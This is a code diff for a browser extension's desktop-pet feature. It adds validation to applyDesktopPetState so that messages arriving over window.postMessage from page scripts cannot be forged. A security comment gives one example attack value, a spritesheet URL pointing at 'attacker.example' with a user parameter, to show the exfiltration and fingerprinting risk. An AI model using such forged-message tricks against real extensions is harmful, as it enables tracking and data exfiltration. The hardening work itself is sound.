@@ -9,6 +9,11 @@ import {
 } from './octoRecall';
 import { OCTO_SELECTORS } from './octoSelectors';
 import {
+  isBuiltInCompanionId,
+  isDesktopPetPosition,
+  isStoredDesktopPet,
+} from './octoPetState';
+import {
   parseDesktopPetManifest,
   resolveDesktopPetAnimations,
   selectDesktopPetAnimation,
@@ -560,33 +565,59 @@ function loadSpritesheet(pet: StoredDesktopPet, position: DesktopPetPosition | n
   image.src = pet.spritesheetDataUrl;
 }
 
+/**
+ * Apply a desktop-pet state message.
+ *
+ * Every field is re-validated here even though the content script already
+ * validated what it read from storage. The reason is that this runs in the page's
+ * MAIN world, where the only transport available is `window.postMessage` — and
+ * any script on the page can send a message that looks exactly like ours. MAIN
+ * world code shares a realm with the page and cannot be truly isolated from it,
+ * so the defence has to be "a forged message can do no harm" rather than
+ * "a forged message cannot arrive".
+ *
+ * Concretely, without the `isStoredDesktopPet` check a page script could send a
+ * pet whose spritesheet is `https://attacker.example/x.png?user=...`, and the
+ * renderer would fetch it — handing the page an outbound request it could use to
+ * fingerprint who has the extension installed, or as an exfiltration channel out
+ * of an intranet deployment. The validator only accepts `data:image/*;base64`,
+ * which removes that capability entirely.
+ */
 export function applyDesktopPetState(message: DesktopPetMessage): void {
-  if (!message.enabled || (!message.pet && !message.builtInCompanion)) {
+  const pet = isStoredDesktopPet(message.pet) ? message.pet : null;
+  const builtInCompanion = isBuiltInCompanionId(message.builtInCompanion)
+    ? message.builtInCompanion
+    : null;
+  const placement: DesktopPetPlacement =
+    message.placement === 'composer' ? 'composer' : 'desktop';
+  const position = isDesktopPetPosition(message.position) ? message.position : null;
+
+  if (message.enabled !== true || (!pet && !builtInCompanion)) {
     removePet();
     teardownBuiltInCompanion();
     return;
   }
 
-  if (message.builtInCompanion) {
+  if (builtInCompanion) {
     removePet();
-    applyBuiltInCompanion(message.builtInCompanion);
+    applyBuiltInCompanion(builtInCompanion);
     return;
   }
 
   teardownBuiltInCompanion();
-  if (!message.pet) return;
+  if (!pet) return;
 
-  const placementChanged = lastPlacement !== message.placement;
-  lastPlacement = message.placement;
+  const placementChanged = lastPlacement !== placement;
+  lastPlacement = placement;
   const samePet =
-    lastPet?.manifest.id === message.pet.manifest.id &&
-    JSON.stringify(lastPet?.manifest) === JSON.stringify(message.pet.manifest) &&
-    lastPet?.spritesheetDataUrl === message.pet.spritesheetDataUrl;
-  lastPet = message.pet;
-  lastPosition = message.position;
+    lastPet?.manifest.id === pet.manifest.id &&
+    JSON.stringify(lastPet?.manifest) === JSON.stringify(pet.manifest) &&
+    lastPet?.spritesheetDataUrl === pet.spritesheetDataUrl;
+  lastPet = pet;
+  lastPosition = position;
 
   if (!samePet || placementChanged || !document.getElementById(ROOT_ID)) {
-    loadSpritesheet(message.pet, message.position);
+    loadSpritesheet(pet, position);
     return;
   }
   const root = document.getElementById(ROOT_ID);
@@ -597,7 +628,7 @@ export function applyDesktopPetState(message: DesktopPetMessage): void {
   } else {
     stopComposerTracking();
     root.style.visibility = 'visible';
-    if (message.position) setPosition(root, message.position);
+    if (position) setPosition(root, position);
   }
 }
 
